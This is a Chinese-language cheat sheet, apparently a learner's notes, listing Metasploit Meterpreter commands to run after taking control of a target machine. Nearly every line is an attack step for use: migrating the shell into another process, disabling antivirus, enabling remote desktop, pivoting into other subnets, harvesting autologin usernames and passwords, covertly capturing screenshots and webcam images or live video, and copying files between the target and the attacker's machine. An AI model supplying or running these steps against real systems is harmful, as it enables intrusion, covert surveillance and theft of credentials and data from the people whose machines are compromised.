(ps.拿到了目标机权限后，进入meterpreter)
1，先进行进程迁移输入 `ps` 查看所有的进程，使用 `getpid` 查看自己的Meterpreter Shell的进程号，然后选择一个稳定的进程使用 `migrate 448` 命令把Shell迁移到448的进程中(ps.如果不行的话使用自动迁移进程命令，自己网上找)

---

2，系统命令在`meterpreter`中
- 输入sysinfo命令查看目标机的系统信息
- 输入`run post/windows/gather/checkvm` 检查目标机是否在虚拟机上
- 输入`idletime`可以查看目标及最近运行的时间
- 输入route命令查看目标及完整的网络设置
- 可以输入`background` 将当前会话放到后台，再使用`session`查看所有的火会话，使用`session -i -数字` 打开其中的会话
- 输入`run post/windows/manage/killav` 关闭目标机的系统杀毒软件
- 输入`run post/windows/manage/enable_rdp`命令启动目标机的远程桌面协议，也就是常说的3389端口
- 然后输入`run post/multi/manage/autoroute`命令查看目标机的本地子网连接情况
- 接着进行跳转。先输入`background`命令将当前Meterpreter终端隐藏在后台，然后输入`route add 192.168.232.1 255.255.255.0 1`命令添加路由，添加成功后输入`route print `命令查看
- 可以看到一条地址为192.168.232.1的路由已经被添加到已经攻陷的主机的路由表中，这样就可以借助被攻陷的主机进行对其他网络的攻击了
- 接着输入`run post/windows/gather/enum_logged_on_users`命令列举当前有多少用户登录了目标机
- 继续输入`run post/windows/gather/enum_applications`命令列举安装在目标机上的应用程序
- 很多用户习惯将计算机设置为自动登录，下面这个命令可以抓取到自动登录的用户名和密码`run windows/gather/credentials/windows_autologin`
- 使用`load espia`命令加载该插件，然后输入`screegrab`可以抓取此时目标及的屏幕截图（ps.`screenshot`也是同样的效果）
- 输入 `webcam_list`查看目标机有无摄像头
- 输入`webcam_snap`命令打开目标机摄像头，拍一张照片
- 输入`webcam_stream`命令甚至还可以开启直播模式，上面这句返回的地址用浏览器打开就可以查看抓取的视频
- 输入`shell`进入目标机的shell下面
- 输入`exit`可以退出当前进行的
- `pwd`或`getwd`查看当前处于目标机的那个目录
- `getlwd`查看当前处于本地的那个目录
- `ls`列出当前目录的所有文件
- `cd`切换目录
- `search -f *.txt -d c:\`可以搜索C盘所有以“.txt”为扩展名的文件，其中-f参数用于指定搜索文件模式，-d参数用于指定再哪个目录下进行搜索
- `download c:/test.txt \root:` 下载目标机的test.txt文件到攻击机root下
- `upload /root/test.txt c:\`上传攻击机root目录下的test.txt文件到目标机c盘下